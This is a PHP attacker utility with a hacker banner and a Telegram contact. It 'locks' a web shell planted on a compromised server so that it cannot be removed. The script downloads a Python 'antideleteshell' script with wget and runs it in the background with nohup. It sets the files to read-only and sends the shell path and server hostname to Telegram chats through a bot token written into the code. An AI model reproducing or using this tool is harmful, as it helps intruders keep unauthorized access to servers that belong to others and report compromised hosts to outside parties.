<?php
echo "<pre style='color:lime'>";
echo <<<'ASCII'
___________________   ________  .____       _________ _______________.___.
\__    ___/\_____  \  \_____  \ |    |     /   _____/ \______   \__  |   |
  |    |    /   |   \  /   |   \|    |     \_____  \   |    |  _//   |   |
  |    |   /    |    \/    |    \    |___  /        \  |    |   \\____   |
  |____|   \_______  /\_______  /_______ \/_______  /  |______  // ______|
                   \/         \/        \/        \/          \/ \/
__________.___.____    .____     __________ .____    .________________________________________________________
\______   \   |    |   |    |    \____    / |    |   |   \_   _____/\______   \_   _____/\______   \__    ___/
 |    |  _/   |    |   |    |      /     /  |    |   |   ||    __)_  |    |  _/|    __)_  |       _/ |    |
 |    |   \   |    |___|    |___  /     /_  |    |___|   ||        \ |    |   \|        \ |    |   \ |    |
 |______  /___|_______ \_______ \/_______ \ |_______ \___/_______  / |______  /_______  / |____|_  / |____|
        \/            \/       \/        \/         \/           \/         \/        \/         \/  

ASCII;
echo "telegram author?https://t.me/billzajaa";
echo "</pre><hr>";

if (isset($_POST["lock"])) {
    $shellPath = $_POST["shell_path"];
    $modulPath = "/tmp/modul.py";
    $systemPath = "/tmp/system.py";

    $modulContent = "data = '{$shellPath}'";
    file_put_contents($modulPath, $modulContent);

    // Download Python script
    system("wget -q https://raw.githubusercontent.com/xzourt/antideleteshell/main/system.py -O {$systemPath}");

    // Run in background
    system("nohup python {$systemPath} > /dev/null 2>&1 &");

    // Make files read-only
    chmod($shellPath, 0444);
    chmod($modulPath, 0444);
    chmod($systemPath, 0444);

    // Kirim ke Telegram bot
    $botToken = "7542289496:AAFHFBvOdOXpE49TTqeq7RHprGSe-D2GzKg";
    $chatIds = ["4756289883", "6741595175"]; // Grup dan admin

    $message = "🔐 Shell locked!\nPath: {$shellPath}\nHost: " . gethostname();

    foreach ($chatIds as $chatId) {
        $sendURL = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $params = [
            'chat_id' => $chatId,
            'text' => $message
        ];
        file_get_contents($sendURL . '?' . http_build_query($params));
    }

    echo "<p style='color:lime;'>✅ Shell is now protected: <code>{$shellPath}</code></p>";
}
?>

<form method="post" style="margin-top:20px;">
    <label><b>🔒 Path lengkap shell yang mau dikunci:</b></label><br>
    <input type="text" name="shell_path" value="" style="width: 500px;"><br><br>
    <input type="submit" name="lock" value="Lock Shell Sekarang!" style="padding: 10px; background: #111; color: lime; border: 1px solid lime; cursor:pointer;">
</form>
